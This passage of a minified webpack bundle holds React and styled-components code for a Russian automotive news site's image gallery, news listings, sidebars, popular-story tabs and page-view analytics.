            f = "/404/" === ((0, c.v9)(s.sJ) || {}).href,
            w = {
              CO_PARAMS_CARMODELS: I ? I.map(function (e) {
                return e.name;
              }) : [],
              CO_PARAMS_CARMARKS: I ? I.map(function (e) {
                return e.carBrand.name;
              }) : []
            },
            z = function (e) {
              for (var t = 1; t < arguments.length; t++) {
                var i = null != arguments[t] ? arguments[t] : {};
                t % 2 ? d(Object(i), !0).forEach(function (t) {
                  r()(e, t, i[t]);
                }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : d(Object(i)).forEach(function (t) {
                  Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
                });
              }
              return e;
            }({
              CO_PARAMS_AUTHORS: u ? u.map(function (e) {
                return e.name;
              }) : [],
              CO_PARAMS_PUBLISHERS: m ? m.map(function (e) {
                return e.name;
              }) : [],
              CO_PARAMS_CATEGORIES: p ? p.map(function (e) {
                return e.name;
              }) : [],
              CO_PARAMS_TAGS: y ? y.map(function (e) {
                return e.name;
              }) : [],
              published: function () {
                if (!N) return "";
                var e = N.day && N.day < 10 ? "0".concat(N.day) : N.day,
                  t = N.month && N.month < 10 ? "0".concat(N.month) : N.month;
                return "".concat(e, "-").concat(t, "-").concat(N.year);
              }()
            }, I && w),
            T = {
              endless: "endless".concat(void 0 !== n ? n + 1 : "")
            };
          return (0, a.useEffect)(function () {
            if (void 0 !== h) {
              var e = {
                  layout: h ? "mobile" : x ? "tablet" : "desktop"
                },
                r = "".concat(window.location.pathname).concat(window.location.search),
                a = t && z,
                o = "/" === window.location.pathname ? "homepage" : f ? "error 404" : "",
                l = i || D,
                c = void 0 !== n ? T : void 0;
              (0, M.qY)({
                type: o,
                url: r,
                title: l,
                layoutParams: e,
                storyParams: a,
                endlessParams: c
              });
            }
          }, [h]), null;
        }
      },
      63: (e, t, i) => {
        i.r(t), i.d(t, {
          default: () => A
        });
        var n = i(7154),
          r = i.n(n),
          a = i(7294),
          o = i(9163),
          l = i(8655),
          c = i(2700),
          s = (0, o.ZP)(c.Z).withConfig({
            displayName: "styled__GalleryImg",
            componentId: "sc-z43jib-0"
          })(["object-fit:contain;max-height:100%;margin:auto;", ""], (0, l.fq)("$isFullscreen", (0, o.iv)(["max-height:calc(100vh - 220px);@media (max-width:1024px){max-height:100vh;}"]))),
          M = o.ZP.div.withConfig({
            displayName: "styled__GalleryWrapper",
            componentId: "sc-z43jib-1"
          })(["height:100%;width:100%;background:#000;display:flex;flex-direction:column;"]),
          d = o.ZP.div.withConfig({
            displayName: "styled__GalleryTop",
            componentId: "sc-z43jib-2"
          })(["height:90px;margin-bottom:15px;margin-top:-50px;text-align:center;padding:0 100px;box-sizing:border-box;@media (max-width:1024px){display:none;}"]),
          g = o.ZP.div.withConfig({
            displayName: "styled__GalleryInner",
            componentId: "sc-z43jib-3"
          })(["display:flex;flex-flow:row;justify-content:space-around;height:100%;padding:0 100px;@media (max-width:1024px){padding:0;height:100vh;}"]),
          u = o.ZP.div.withConfig({
            displayName: "styled__GalleryImgContainer",
            componentId: "sc-z43jib-4"
          })(["padding:0 50px;margin-top:2px;position:relative;width:100%;height:calc(100% - 90px);flex-grow:1;display:flex;@media (max-width:1024px){padding:0;}"]),
          m = o.ZP.div.withConfig({
            displayName: "styled__GalleryTitle",
            componentId: "sc-z43jib-5"
          })(['position:absolute;bottom:auto;top:100%;text-align:left;width:100%;&:before{background-color:#000;opacity:50%;content:"";height:50px;width:100%;position:absolute;top:0;left:0;right:0;}div{display:-webkit-box;color:#fff;position:relative;height:100%;padding:4px 3rem 4px 0;white-space:break-spaces;line-height:1.2;font-size:1.125rem;overflow:hidden;text-overflow:ellipsis;-webkit-line-clamp:2;-webkit-box-orient:vertical;}@media (min-width:1900px){height:100px;&:before{height:100px;}div{font-size:1.125rem;height:100%;}}@media (max-width:1024px){top:auto;bottom:-70px;&:before{height:100%;}div{font-size:1rem;padding:4px 8rem;-webkit-line-clamp:3;}}@media (max-width:450px){div{padding:0px 2rem;width:calc(100% - 32px);}}']),
          p = o.ZP.div.withConfig({
            displayName: "styled__GalleryBannerRight",
            componentId: "sc-z43jib-6"
          })(["width:300px;flex-shrink:0;height:100%;@media (max-width:1024px){display:none;}"]),
          y = o.ZP.div.withConfig({
            displayName: "styled__FullscreenButton",
            componentId: "sc-z43jib-7"
          })(['position:absolute;width:100%;height:100%;top:0;bottom:0;right:0;left:0;cursor:pointer;z-index:3;&:before{content:"";position:absolute;right:0;bottom:0;width:32px;height:32px;background:url(', ") no-repeat 0 0;z-index:2;pointer-events:none;}", " ", " @media (max-width:1024px){", "}"], "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbDpzcGFjZT0icHJlc2VydmUiIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggb3BhY2l0eT0iLjQiIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMCAwaDMydjMySDB6Ii8+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGZpbGw9IiNEQURBREEiIGQ9Im0xMyAxNy02LjIgNi4yVjE5SDR2OWg5di0yLjhIOC44TDE1IDE5bC0yLTJ6bTYtMiA2LjItNi4yVjEzSDI4VjRoLTl2Mi44aDQuMkwxNyAxM2wyIDJ6Ii8+PC9zdmc+", (0, l.fq)("$showClose", (0, o.iv)(["position:fixed;top:20px;left:auto;bottom:auto;right:20px;height:50px;width:50px;background-image:url(", ");background-size:cover;&:before{display:none;}"], "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMSIgaGVpZ2h0PSIxMSIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CiAgPHBhdGggZD0ibS41LjUgOCA4bTAtOC04IDgiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+Cjwvc3ZnPgo=")), (0, l.fq)("$hideFullIco", (0, o.iv)(["&:before{display:none;}"])), (0, l.fq)("$showClose", (0, o.iv)(["top:10px;right:10px;"]))),
          I = i(6982),
          N = i.n(I),
          j = i(405),
          h = i(4751),
          x = i(2876),
          D = i(6804);
        function f(e) {
          var t = e.original,
            i = e.width,
            n = e.height,
            r = e.description;
          return e.isFullscreen ? a.createElement(M, null, a.createElement(d, null, a.createElement(D.Wr, {
            slot: "gallery_banner_top",
            isVisible: [!0, !1]
          })), a.createElement(g, null, a.createElement(u, null, a.createElement(s, {
            noFormatUrl: !0,
            picture: {
              servingUrl: t
            },
            alt: r,
            withoutWrap: !0,
            gallery: !0,
            $isFullscreen: !0
          }), r && a.createElement(m, null, a.createElement("div", null, r))), a.createElement(p, null, a.createElement(D.Wr, {
            slot: "gallery_banner_right",
            isVisible: [!0, !1]
          })))) : a.createElement(s, {
            noFormatUrl: !0,
            picture: {
              servingUrl: t,
              width: i,
              height: n
            },
            alt: r,
            placeholderHeight: [420, 219]
          });
        }
        var w = i(2873),
          z = i(9590),
          T = i.n(z),
          L = i(7137),
          E = (0, a.memo)(function (e) {
            var t = e.gallery,
              i = e.fullScreen,
              n = e.showThumb,
              o = e.showPlayButton,
              l = void 0 !== o && o,
              c = e.hideFullIco,
              s = void 0 === c || c,
              M = (0, h.I0)();
            return a.createElement(a.Fragment, null, a.createElement(j.q, null, a.createElement("link", {
              rel: "stylesheet",
              href: "https://www.zr.ru/public/mobile/gallery.css"
            }), i && a.createElement("style", null, "body{overflow:hidden;}")), a.createElement(N(), {
              items: t,
              useBrowserFullscreen: !1,
              showThumbnails: n,
              showPlayButton: l,
              renderItem: function (e) {
                return a.createElement(f, r()({
                  isFullscreen: i
                }, e));
              },
              renderFullscreenButton: function (e, t) {
                return a.createElement(y, {
                  $showClose: t,
                  onClick: e,
                  $hideFullIco: s
                });
              },
              onScreenChange: function (e) {
                if (M((0, x.r0)(e)), e) {
                  var i,
                    n,
                    r,
                    a = null !== (i = t[0]) && void 0 !== i && i.galleryId ? null === (n = t[0]) || void 0 === n ? void 0 : n.galleryId : "gallery",
                    o = window ? "".concat(window.location.pathname).concat(window.location.search, "#").concat(a) : "#".concat(a),
                    l = (null === (r = t[0]) || void 0 === r ? void 0 : r.description) || "GalleyPhoto";
                  (0, L.qY)({
                    type: "Gallery",
                    url: o,
                    title: l
                  });
                }
              },
              onSlide: function (e) {
                var n,
                  r,
                  a,
                  o = null !== (n = t[e]) && void 0 !== n && n.galleryId ? null === (r = t[e]) || void 0 === r ? void 0 : r.galleryId : "gallery",
                  l = window ? "".concat(window.location.pathname).concat(window.location.search, "#").concat(o, "-").concat(e) : "#".concat(o, "-").concat(e),
                  c = (null === (a = t[e]) || void 0 === a ? void 0 : a.description) || "GalleyPhoto";
                i && (0, L.qY)({
                  type: "Gallery",
                  url: l,
                  title: c
                });
              }
            }));
          }, T());
        function A(e) {
          var t = e.gallery,
            i = e.showThumb,
            n = e.showPlayButton,
            r = e.hideFullIco,
            o = (0, h.v9)(w.Zn);
          return a.createElement(E, {
            fullScreen: o,
            gallery: t,
            showThumb: i,
            showPlayButton: n,
            hideFullIco: r
          });
        }
        E.displayName = "GalleryContainer";
      },
      3230: (e, t, i) => {
        i.d(t, {
          Z: () => n
        });
        const n = (0, i(2168).ZP)({
          resolved: {},
          chunkName: function () {
            return "gallery";
          },
          isReady: function (e) {
            var t = this.resolve(e);
            return !0 === this.resolved[t] && !!i.m[t];
          },
          importAsync: function () {
            return Promise.resolve().then(i.bind(i, 63));
          },
          requireAsync: function (e) {
            var t = this,
              i = this.resolve(e);
            return this.resolved[i] = !1, this.importAsync(e).then(function (e) {
              return t.resolved[i] = !0, e;
            });
          },
          requireSync: function (e) {
            var t = this.resolve(e);
            return i(t);
          },
          resolve: function () {
            return 63;
          }
        });
      },
      4193: (e, t, i) => {
        i.d(t, {
          Z: () => c
        });
        var n = i(7294),
          r = i(9163),
          a = r.ZP.div.withConfig({
            displayName: "styled__MainBlock",
            componentId: "sc-w2kk5j-0"
          })(["display:flex;height:", ";@media (max-width:1024px){height:auto;}"], function (e) {
            return e.$height ? "".concat(e.$height, "px") : "auto";
          }),
          o = r.ZP.div.withConfig({
            displayName: "styled__BlockContent",
            componentId: "sc-w2kk5j-1"
          })(["width:100%;max-width:682px;@media (max-width:1024px){max-width:100%;}"]),
          l = r.ZP.aside.withConfig({
            displayName: "styled__Sidebar",
            componentId: "sc-w2kk5j-2"
          })(["padding-bottom:2rem;width:300px;flex-shrink:0;margin:0 1rem 0 1rem;z-index:0;position:relative;@media (max-width:1024px){display:none;}"]);
        function c(e) {
          var t = e.content,
            i = e.sidebar,
            r = e.height;
          return n.createElement(a, {
            $height: r
          }, n.createElement(o, null, t), n.createElement(l, null, i));
        }
      },
      880: (e, t, i) => {
        i.d(t, {
          Z: () => x
        });
        var n = i(7294),
          r = i(8655),
          a = i(9163),
          o = i(8526),
          l = a.ZP.div.withConfig({
            displayName: "styled__NewsBlock",
            componentId: "sc-1dlw7s3-0"
          })(['padding-bottom:0.1875rem;@media (max-width:1024px){margin:0 -12px;position:relative;padding:0 12px;&:before{content:"";display:block;width:100%;height:2px;position:absolute;left:0;right:0;top:2px;padding-bottom:14px;}&:after{top:-6px;content:"";display:block;width:100%;height:2px;position:absolute;left:0;right:0;}}']),
          c = (0, a.ZP)(o.rH).withConfig({
            displayName: "styled__NewsTitle",
            componentId: "sc-1dlw7s3-1"
          })(["display:block;font-size:1.75rem;line-height:2.125rem;text-transform:uppercase;font-weight:500;padding-top:14px;&:hover{border-color:transparent;span{border-bottom:1px solid #970000;}}", ""], (0, r.fq)("$hideTitle", (0, a.iv)(["display:none;"]))),
          s = a.ZP.div.withConfig({
            displayName: "styled__NewsMain",
            componentId: "sc-1dlw7s3-2"
          })(["display:flex;align-items:flex-start;flex-flow:row;@media (max-width:1024px){flex-flow:column;}"]),
          M = (0, a.ZP)(o.rH).withConfig({
            displayName: "styled__NewsMainLink",
            componentId: "sc-1dlw7s3-3"
          })(["width:23.0625rem;text-decoration:none;flex-shrink:0;margin-right:0.875rem;img{width:100%;max-width:100%;}@media (max-width:1024px){width:100%;display:block;height:auto;margin-top:6px;margin-right:0;}"]),
          d = a.ZP.div.withConfig({
            displayName: "styled__NewsMainWrap",
            componentId: "sc-1dlw7s3-4"
          })(["margin-top:-0.3125rem;@media (max-width:1024px){margin-top:8px;}"]),
          g = (0, a.ZP)(o.rH).withConfig({
            displayName: "styled__NewsMainTitle",
            componentId: "sc-1dlw7s3-5"
          })(["color:#000;font-size:1.625rem;font-weight:700;line-height:1;&:hover{color:#e40025;border-color:#e40025;}@media (max-width:1024px){display:block;text-decoration:none;font-weight:800;margin-bottom:-0.5rem;font-size:1.5rem;line-height:1.625rem;}"]),
          u = a.ZP.div.withConfig({
            displayName: "styled__NewsMainDescription",
            componentId: "sc-1dlw7s3-6"
          })(["margin-top:0.8125rem;line-height:1.2;font-size:1.125rem;@media (max-width:1024px){font-size:1rem;line-height:1.2rem;padding-top:0rem;letter-spacing:0rem;padding-bottom:15px;}"]),
          m = a.ZP.div.withConfig({
            displayName: "styled__NewsItems",
            componentId: "sc-1dlw7s3-7"
          })(["display:flex;align-items:flex-start;flex-wrap:wrap;margin-right:-1rem;margin-top:2rem;@media (max-width:1024px){margin:15px 0 0 0;flex-flow:row wrap;justify-content:space-between;}"]),
          p = a.ZP.div.withConfig({
            displayName: "styled__NewsItem",
            componentId: "sc-1dlw7s3-8"
          })(["width:50%;padding-right:1rem;margin-bottom:0.5rem;box-sizing:border-box;display:flex;align-items:flex-start;@media (max-width:1024px){width:calc(50% - 6px);padding-bottom:16px;flex-flow:column;padding-right:0;margin-bottom:0;}"]),
          y = (0, a.ZP)(o.rH).withConfig({
            displayName: "styled__NewsItemLink",
            componentId: "sc-1dlw7s3-9"
          })(["width:11rem;margin-right:0.9375rem;flex-shrink:0;height:7rem;overflow:hidden;&:hover{border-color:transparent;}@media (max-width:1024px){width:100%;padding-bottom:62.5%;height:0;}"]),
          I = a.ZP.div.withConfig({
            displayName: "styled__NewsItemTitle",
            componentId: "sc-1dlw7s3-10"
          })(["font-weight:700;line-height:1.2;margin-top:-0.1875rem;@media (max-width:1024px){font-weight:400;font-size:1.125rem;line-height:1.25rem;color:#000000;max-height:100px;overflow:hidden;padding-top:0.5rem;}}"]),
          N = (0, a.ZP)(o.rH).withConfig({
            displayName: "styled__NewsItemTitleLink",
            componentId: "sc-1dlw7s3-11"
          })(["&:hover{color:#e40025;border-color:#e40025;}@media (max-width:1024px){font-size:1rem;line-height:1.1rem;font-weight:800;}"]),
          j = a.ZP.div.withConfig({
            displayName: "styled__NewsAllLink",
            componentId: "sc-1dlw7s3-12"
          })(['font-weight:700;text-align:right;&:after{content:"";height:0.1625rem;margin-top:0.625rem;display:block;background:linear-gradient(180deg,transparent 0,rgba(0,0,0,0.2) 100%);}', " @media (max-width:1024px){font-size:1.5rem;line-height:1.8125rem;text-transform:uppercase;width:100%;font-weight:400;margin-bottom:1.5rem;padding-top:0;&:after{display:none;}}"], (0, r.fq)("$hideLink", (0, a.iv)(["display:none;"]))),
          h = i(2700);
        function x(e) {
          var t = e.mainNews,
            i = e.news,
            r = e.hideLink,
            a = e.hideTitle;
          return n.createElement(l, null, n.createElement(c, {
            href: "/news/",
            color: "#970000",
            $hideTitle: a
          }, n.createElement("span", null, "Новости")), t && n.createElement(s, null, t.href && n.createElement(M, {
            href: t.href
          }, t.picture && n.createElement(h.Z, {
            picture: t.picture
          })), n.createElement(d, null, t.href && n.createElement(g, {
            href: t.href
          }, t.name), n.createElement(u, null, t.announcementXml))), n.createElement(m, null, i.map(function (e) {
            var t = e.name,
              i = e.href,
              r = e.picture,
              a = e.id;
            return n.createElement(p, {
              key: a
            }, i && n.createElement(y, {
              href: i
            }, r && n.createElement(h.Z, {
              picture: r,
              small: !0
            })), n.createElement(I, null, i && n.createElement(N, {
              href: i,
              color: "#000"
            }, t)));
          })), n.createElement(j, {
            $hideLink: r
          }, n.createElement(o.rH, {
            color: "#970000",
            href: "/news/"
          }, "ВСЕ НОВОСТИ ›")));
        }
      },
      4198: (e, t, i) => {
        i.d(t, {
          Z: () => n
        });
        const n = (0, i(2168).ZP)({
          resolved: {},
          chunkName: function () {
            return "slider";
          },
          isReady: function (e) {
            var t = this.resolve(e);
            return !0 === this.resolved[t] && !!i.m[t];
          },
          importAsync: function () {
            return i.e(309).then(i.bind(i, 6002));
          },
          requireAsync: function (e) {
            var t = this,
              i = this.resolve(e);
            return this.resolved[i] = !1, this.importAsync(e).then(function (e) {
              return t.resolved[i] = !0, e;
            });
          },
          requireSync: function (e) {
            var t = this.resolve(e);
            return i(t);
          },
          resolve: function () {
            return 6002;
          }
        });
      },
      9077: (e, t, i) => {
        i.d(t, {
          Z: () => c
        });
        var n = i(7294),
          r = i(4751),
          a = i(7742),
          o = i(2873),
          l = i(8526);
        function c() {
          var e = (0, r.v9)(o.Gc);
          return e && e.length ? n.createElement(a.Z, {
            isSticky: !0,
            name: "Главные новости",
            grayBack: !0
          }, e.map(function (e) {
            var t = e.href,
              i = e.id,
              r = e.name;
            return n.createElement(l.R6, {
              key: i
            }, n.createElement(l.rH, {
              href: t || "",
              color: "#000"
            }, r));
          })) : null;
        }
      },
      8929: (e, t, i) => {
        i.d(t, {
          Z: () => c
        });
        var n = i(7294),
          r = i(4751),
          a = i(7742),
          o = i(2873),
          l = i(8526);
        function c() {
          var e = (0, r.v9)(o.cb);
          return e ? n.createElement(a.Z, {
            isSticky: !0,
            name: "Новые тест-драйвы",
            grayBack: !0
          }, e.map(function (e) {
            var t = e.href,
              i = e.id,
              r = e.name;
            return n.createElement(l.R6, {
              key: i
            }, n.createElement(l.rH, {
              href: t || "",
              color: "#000"
            }, r));
          })) : null;
        }
      },
      7004: (e, t, i) => {
        i.d(t, {
          Z: () => u
        });
        var n = i(7294),
          r = i(4751),
          a = i(7742),
          o = i(2873),
          l = i(9163),
          c = i(8526),
          s = l.ZP.div.withConfig({
            displayName: "styled__NowCommentsContainer",
            componentId: "sc-1fy5kxj-0"
          })(["@media (max-width:1024px){display:flex;flex-flow:row wrap;justify-content:space-between;margin-top:15px;padding-bottom:14px;}"]),
          M = (0, l.ZP)(c.R6).withConfig({
            displayName: "styled__NowCommentsItem",
            componentId: "sc-1fy5kxj-1"
          })(["@media (max-width:1024px){display:block;width:100%;}"]),
          d = (0, l.ZP)(c.rH).withConfig({
            displayName: "styled__NowCommentsLink",
            componentId: "sc-1fy5kxj-2"
          })(["@media (max-width:1024px){font-size:1rem;line-height:1.2rem;padding-top:0rem;letter-spacing:0rem;}"]),
          g = (0, l.ZP)(c.pZ).withConfig({
            displayName: "styled__NowCommentsItemCounters",
            componentId: "sc-1fy5kxj-3"
          })(["@media (max-width:1024px){font-size:0.875rem;line-height:0.875rem;padding:5px 0 7px 0;}"]);
        function u() {
          var e = (0, r.v9)(o.rI),
            t = (0, r.v9)(o.ov);
          return e ? n.createElement(a.Z, {
            isPlain: !0,
            name: "Актуальное",
            grayBack: !0
          }, n.createElement(s, null, e.slice(0, 4).map(function (e) {
            var t = e.href,
              i = e.id,
              r = e.name,
              a = e.visitCounter;
            return n.createElement(M, {
              key: i
            }, n.createElement(d, {
              href: t,
              color: "#000"
            }, r), n.createElement(g, {
              visits: a
            }));
          }), t && t.map(function (e) {
            var t = e.href,
              i = e.id,
              r = e.name,
              a = e.visitCounter;
            return n.createElement(M, {
              key: i
            }, n.createElement(d, {
              href: t,
              color: "#000"
            }, r), n.createElement(g, {
              visits: a
            }));
          }))) : null;
        }
      },
      9735: (e, t, i) => {
        i.d(t, {
          Z: () => I
        });
        var n = i(3038),
          r = i.n(n),
          a = i(7294),
          o = i(9163),
          l = i(8655),
          c = i(8526),
          s = o.ZP.div.withConfig({
            displayName: "styled__PopularTabs",
            componentId: "sc-qvomqw-0"
          })(["display:flex;align-items:center;margin-bottom:0.6875rem;@media (max-width:1024px){margin-top:14px;margin-bottom:17px;}"]),
          M = o.ZP.div.withConfig({
            displayName: "styled__PopularTab",
            componentId: "sc-qvomqw-1"
          })(["font-size:0.875rem;padding-bottom:0.0625rem;border-bottom:0.25rem solid transparent;cursor:pointer;transition:0.3s;margin-right:0.875rem;text-transform:uppercase;&:hover{border-color:#ddd;}", " @media (max-width:1024px){font-size:1.0625rem;line-height:1.5625rem;border:none;white-space:nowrap;", "}"], (0, l.fq)("$isActive", (0, o.iv)(["border-color:#970000;&:hover{border-color:#970000;}"])), (0, l.fq)("$isActive", (0, o.iv)(["padding:0 12px;margin-right:14px;color:#ffffff;background:#970000;"]))),
          d = o.ZP.div.withConfig({
            displayName: "styled__PopularItems",
            componentId: "sc-qvomqw-2"
          })(["@media (max-width:1024px){column-gap:23px;columns:1;}"]),
          g = o.ZP.div.withConfig({
            displayName: "styled__PopularItem",
            componentId: "sc-qvomqw-3"
          })(["display:flex;&:not(:last-child){margin-bottom:1.3125rem;}@media (max-width:1024px){display:inline-flex;padding-bottom:7px;&:not(:last-child){margin-bottom:0;}}"]),
          u = o.ZP.div.withConfig({
            displayName: "styled__PopularItemWrap",
            componentId: "sc-qvomqw-4"
          })(["width:100%;"]),
          m = o.ZP.div.withConfig({
            displayName: "styled__PopularItemId",
            componentId: "sc-qvomqw-5"
          })(["font-size:2.8125rem;font-weight:700;color:grey;margin-right:0.6875rem;margin-left:-0.125rem;flex-shrink:0;line-height:2.5rem;@media (max-width:1024px){font-weight:400;line-height:2.375rem;color:#808080;}"]),
          p = (0, o.ZP)(c.rH).withConfig({
            displayName: "styled__PopularItemLink",
            componentId: "sc-qvomqw-6"
          })(["line-height:1.2;@media (max-width:1024px){font-size:1rem;line-height:1.2rem;padding-top:0rem;letter-spacing:0rem;}"]),
          y = i(7742);
        function I() {
          var e = (0, a.useState)("day"),
            t = r()(e, 2),
            i = t[0],
            n = t[1],
            o = (0, a.useState)(),
            l = r()(o, 2),
            I = l[0],
            N = l[1];
          (0, a.useEffect)(function () {
            fetch("https://www.zr.ru/cache/crosslinks/").then(function (e) {
              return e.json();
            }).then(function (e) {
              N(e);
            });
          }, []);
          var j = function (e) {
              n(e);
            },
            h = (I || {}).content || {},
            x = h.topNow,
            D = h.topAll,
            f = h.topWeek,
            w = h.topWeekNew;
          return f || x || D || w ? a.createElement(y.Z, {
            isSticky: !0,
            isPopular: !0,
            name: "Самое популярное",
            grayBack: !0
          }, a.createElement(s, null, a.createElement(M, {
            $isActive: "day" === i,
            onClick: function () {
              return j("day");
            }
          }, "ЗА НЕДЕЛЮ"), a.createElement(M, {
            $isActive: "month" === i,
            onClick: function () {
              return j("month");
            }
          }, "За месяц"), a.createElement(M, {
            $isActive: "all" === i,
            onClick: function () {
              return j("all");
            }
          }, "За все время")), "day" === i && a.createElement(d, null, w && w.stories && w.stories.map(function (e, t) {
            var i = e.id,
              n = e.name,
              r = e.href,
              o = e.visitCounter;
            return a.createElement(g, {
              key: i
            }, a.createElement(m, null, t + 1), a.createElement(u, null, a.createElement(p, {
              href: r,
              color: "#000"
            }, n), a.createElement(c.pZ, {
              visits: o,
              isPopular: !0
            })));
          })), "month" === i && a.createElement(d, null, f && f.stories && f.stories.map(function (e, t) {
            var i = e.id,
              n = e.name,
              r = e.href,
              o = e.visitCounter;
            return a.createElement(g, {
              key: i
            }, a.createElement(m, null, t + 1), a.createElement(u, null, a.createElement(p, {
              href: r,
              color: "#000"
            }, n), a.createElement(c.pZ, {
              visits: o,
              isPopular: !0
            })));
          })), "all" === i && a.createElement(d, null, D && D.stories && D.stories.map(function (e, t) {
            var i = e.id,
              n = e.name,
              r = e.href,
              o = e.visitCounter;
            return a.createElement(g, {
              key: i
            }, a.createElement(m, null, t + 1), a.createElement(u, null, a.createElement(p, {
              href: r,
              color: "#000"
            }, n), a.createElement(c.pZ, {
              visits: o,
              isPopular: !0
            })));
          }))) : null;
        }
      },
      5167: (e, t, i) => {
        i.d(t, {
          Z: () => m
        });
        var n = i(7294),
          r = i(9163),
          a = i(8655),
          o = r.ZP.aside.withConfig({
            displayName: "styled__Sidebar",
            componentId: "sc-5tvg1s-0"
          })(["display:flex;flex-direction:column;width:300px;flex-shrink:0;margin:0 1rem 0 1rem;z-index:0;margin-top:", ";@media (max-width:1024px){display:none;}"], function (e) {
            return e.$sidebarTop ? "".concat(e.$sidebarTop, "px") : "0";
          }),
          l = r.ZP.div.withConfig({
            displayName: "styled__SidebarWrap",
            componentId: "sc-5tvg1s-1"
          })(["margin-bottom:24px;flex-shrink:0;height:", ";", " ", ""], function (e) {
            return e.$height ? "".concat(e.$height, "px") : "auto";
          }, (0, a.fq)("$isGrow", (0, r.iv)(["flex-grow:1;height:auto;"])), (0, a.fq)("$hidden", (0, r.iv)(["display:none;"]))),
          c = i(6804),
          s = i(9735),
          M = i(8929),
          d = i(9077),
          g = i(369),
          u = i(7742);
        function m(e) {
          var t = e.pageHeight,
            i = void 0 === t ? 3200 : t,
            r = e.className,
            a = e.sidebarTop,
            m = e.shortVer,
            p = i > 4080 && i < 4710,
            y = i >= 4710;
          return n.createElement(o, {
            className: r,
            $sidebarTop: a
          }, n.createElement(l, {
            $height: p ? 1100 : 600,
            $isGrow: m
          }, n.createElement(u.Z, {
            isSticky: p || y || m,
            withoutPadding: !0
          }, n.createElement(c.Wr, {
            slot: "6",
            isVisible: [!0, !1]
          }))), !m && n.createElement(n.Fragment, null, n.createElement(l, {
            $height: 880
          }, n.createElement(s.Z, null)), (p || y) && n.createElement(n.Fragment, null, n.createElement(l, {
            $height: 1200,
            $isGrow: !0
          }, n.createElement(u.Z, {
            isSticky: !0,
            withoutPadding: !0
          }, n.createElement(c.Wr, {
            slot: "8",
            isVisible: [!0, !1]
          }))), n.createElement(l, {
            $height: 630
          }, n.createElement(M.Z, null)), n.createElement(l, {
            $height: 600
          }, n.createElement(d.Z, null))), y && n.createElement(n.Fragment, null, n.createElement(l, {
            $height: 740
          }, n.createElement(g.Z, null)))));
        }
      },
      7742: (e, t, i) => {
        i.d(t, {
          Z: () => y
        });
        var n = i(7154),
          r = i.n(n),
          a = i(6479),
          o = i.n(a),
          l = i(7294),
          c = i(9163),
          s = i(8655),
          M = i(8526),
          d = c.ZP.div.withConfig({
            displayName: "styled__SidebarName",
            componentId: "sc-10tci88-0"
          })(["font-size:1.625rem;font-weight:700;margin-bottom:1rem;margin-top:-0.5625rem;"]),
          g = c.ZP.div.withConfig({
            displayName: "styled__SidebarWrap",
            componentId: "sc-10tci88-1"
          })(["max-width:300px;"]),
          u = c.ZP.div.withConfig({
            displayName: "styled__SidebarBlock",
            componentId: "sc-10tci88-2"
          })(["background:", ";position:static;padding:1.2rem;", " ", " ", " ", " ", " @media (max-width:1024px){padding:1.5rem 0.5rem 0;margin:0;", " ", "}"], function (e) {
            return e.$grayBack ? "#f2f2f2" : "#ffffff";
          }, (0, s.fq)("$withoutPadding", (0, c.iv)(["padding:0;"])), (0, s.fq)("$isSticky", (0, c.iv)(["position:sticky;top:131px;"])), (0, s.fq)("$isPlain", (0, c.iv)(["background:#fff;padding:0;", "{margin-top:-0.375rem;line-height:1.2;}"], d)), (0, s.fq)("$isPopular", (0, c.iv)(["", "{margin-bottom:0.4375rem;}"], d)), (0, s.fq)("$isPlain", (0, c.iv)(["", "{max-width:18.75rem;}"], g)), (0, s.fq)("$isPopular", (0, c.iv)(["background:#ffff;margin:18px -10px 16px -5px;", "{color:#970000;font-size:1.75rem;line-height:2.125rem;text-transform:uppercase;font-weight:400;}", "{max-width:100%;width:100%;}"], d, g)), (0, s.fq)("$isPlain", (0, c.iv)(["background:#f2f2f2;padding:25px 12px 0 12px;", "{color:#970000;margin-top:-0.375rem;font-size:1.75rem;line-height:2.125rem;text-transform:uppercase;font-weight:400;}", "{max-width:100%;width:100%;}"], d, g))),
          m = (0, c.ZP)(M.rH).withConfig({
            displayName: "styled__SidebarLink",
            componentId: "sc-10tci88-3"
          })(["&:hover{border-color:transparent;}"]),
          p = ["href", "name", "isSticky", "isPlain", "isPopular", "children", "withoutPadding", "grayBack"];
        function y(e) {
          var t = e.href,
            i = e.name,
            n = e.isSticky,
            a = e.isPlain,
            c = e.isPopular,
            s = e.children,
            M = e.withoutPadding,
            y = e.grayBack,
            I = o()(e, p);
          return l.createElement(u, r()({
            $isSticky: n,
            $isPlain: a,
            $withoutPadding: M,
            $isPopular: c,
            $grayBack: y
          }, I), i && l.createElement(d, null, t ? l.createElement(m, {
            href: t,
            color: "#000"
          }, i) : l.createElement(l.Fragment, null, i)), l.createElement(g, null, s));
        }
      },
      4686: (e, t, i) => {
        i.d(t, {
          Z: () => d
        });
        var n = i(7294),
          r = i(9163),
          a = i(8207),
          o = i(8526),
          l = (0, r.ZP)(o.rH).withConfig({
            displayName: "styled__VideoItem",
            componentId: "sc-68fe22-0"
          })(['position:relative;display:block;margin-top:2px;height:10.9375rem;img{position:relative;display:block;height:100%;object-fit:cover;}&:before{content:"";width:3.1875rem;height:3.25rem;background:url(', ") no-repeat center center;background-size:cover;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transition:0.3s;z-index:1;}@media (max-width:1024px){margin:0;position:relative;padding-bottom:62.5%;height:0;&:before{width:51px;height:51px;}img{position:absolute;top:0;left:0;width:100%;height:100%;filter:brightness(75%);vertical-align:top;}}"], a.Z),
          c = r.ZP.span.withConfig({
            displayName: "styled__VideoTitle",
            componentId: "sc-68fe22-1"
